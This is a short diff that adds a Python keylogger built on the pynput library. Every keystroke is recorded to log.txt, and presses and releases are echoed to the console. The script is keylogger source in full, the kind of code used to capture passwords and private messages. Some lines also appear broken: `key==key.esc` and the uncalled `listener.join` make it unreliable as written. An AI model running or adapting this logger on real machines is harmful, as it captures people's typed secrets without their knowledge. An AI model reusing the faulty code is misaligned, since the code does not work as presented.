@@ -1,0 +1,27 @@
+import pynput
+from pynput.keyboard import Key,Listener
+keys=[]
+def on_press(key):
+    keys.append(key)
+    filewrite(keys)
+    
+    try:
+        print('alphanumeric key {0} pressed'.format(key.char))
+    except AttributeError:
+        print('special key {0} pressed'.format(key))
+
+def filewrite(keys):
+    with open('log.txt','w') as f:
+        for key in keys:
+            k=str(key).replace("'","")
+            f.write(k)
+            f.write(' ')
+            
+def on_release(key): 
+    print('{0} released'.format(key)) 
+    if key==key.esc:
+        return False
+
+with Listener(on_press=on_press,on_release=on_release) as listener:
+          listener.join
+    
